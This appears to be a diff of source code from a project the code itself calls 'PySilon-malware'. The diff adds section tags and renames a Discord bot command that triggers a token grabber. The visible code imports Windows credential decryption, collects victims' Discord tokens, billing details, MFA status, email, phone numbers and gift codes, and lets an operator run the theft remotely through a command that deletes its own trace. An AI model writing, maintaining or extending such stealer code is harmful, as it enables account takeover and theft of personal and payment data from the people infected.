@@ -1,3 +1,4 @@
+#<imports>
 import base64
 import json
 import os
@@ -6,7 +7,9 @@ import requests
 from Crypto.Cipher import AES
 from discord import Embed
 from win32crypt import CryptUnprotectData
+#</imports>
 
+#<engine>
 class grab_discord():
     def initialize(raw_data):
         return fetch_tokens().upload(raw_data)
@@ -222,9 +225,11 @@ class fetch_tokens:
             else:
                 final_to_return.append(json.dumps({'username': username, 'token': token, 'nitro': nitro, 'billing': (payment if payment != "" else "None"), 'mfa': mfa, 'email': (email if email != None else "None"), 'phone': (phone if phone != None else "None"), 'hq_guilds': hq_guilds, 'gift_codes': codes}))
         return final_to_return
+#</engine>
 
-@client.command(name="grab")
-async def grabr(ctx, option=None):
+#<command>
+@client.command(name="grab-discord")
+async def grab_discord(ctx, option=None):
     await ctx.message.delete()
     if option == 'discord':
         await ctx.send("```Grabbing Discord tokens...```")
@@ -235,3 +240,4 @@ async def grabr(ctx, option=None):
         embed = discord.Embed(title="📛 Error",description='```Syntax: .grab <what-to-grab>\nOptions: discord```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
+#</command>
